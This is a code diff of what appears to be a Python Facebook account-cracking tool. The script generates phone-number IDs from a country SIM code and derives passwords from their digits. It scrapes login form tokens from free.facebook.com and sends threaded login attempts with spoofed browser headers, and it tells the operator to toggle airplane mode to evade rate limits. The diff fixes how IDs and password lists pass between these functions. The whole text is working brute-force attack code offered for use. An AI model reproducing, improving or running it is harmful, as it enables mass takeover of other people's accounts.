@@ -357,18 +357,17 @@ def INDIA():
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      idf = '+1'+ids
       pwv = [ids[:6],ids[:8],ids,]
-      if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
-      elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
-      elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
-      elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
-      elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
-      elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
-      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
-      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
+      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
+      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
+      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
+      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
+      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
+      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
       else:
-       king_xd.submit(m5,idf,pwv)
+       king_xd.submit(m5,ids,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
 #━━━━[ PAKISTAN RANDOM ]━━━━#
@@ -398,7 +397,7 @@ def PAKISTAN():
             zar0Sefat.submit(__API__,ids,passlist,tl,ck)
     print("");linex();print(f"{rad}[{white}◆{rad}] {green}PROCESS HAS BEEN COMPLETED");print(f"{rad}[{white}◆{rad}] {green}TOTAL OK   {white}▶︎ {green}{len(oks)}");linex();exit()
 #━━━━[ METHOD API ]━━━━#
-def m1(idf,pwv):
+def m1(ids,pwv):
     global loop,oks,cps
     animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
     sys.stdout.write(f"\r{rad}[{animasi}-{H}M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]"),
@@ -406,7 +405,7 @@ def m1(idf,pwv):
     session=requests.Session()
     ua = ua_valid()
     try:
-        for pas in passlist:
+        for pas in pwv:
             free_fb = session.get('https://free.facebook.com').text
             info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
             update={'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
